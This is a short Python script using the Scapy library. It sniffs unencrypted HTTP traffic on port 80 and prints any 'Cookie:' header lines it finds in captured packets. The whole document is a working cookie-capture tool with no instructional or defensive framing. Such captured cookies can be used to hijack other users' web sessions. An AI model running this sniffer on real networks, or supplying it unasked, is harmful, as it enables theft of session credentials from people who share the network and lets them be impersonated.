from scapy.all import sniff, TCP, Raw

def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load.decode(errors="ignore")
        if "Cookie:" in payload:
            print("[+] HTTP Cookie Found!")
            lines = payload.split("\r\n")
            for line in lines:
                if "Cookie:" in line:
                    print(f"[+] {line}")

print("[*] Starting HTTP cookie sniffer...")
sniff(filter="tcp port 80", prn=packet_callback, store=0)
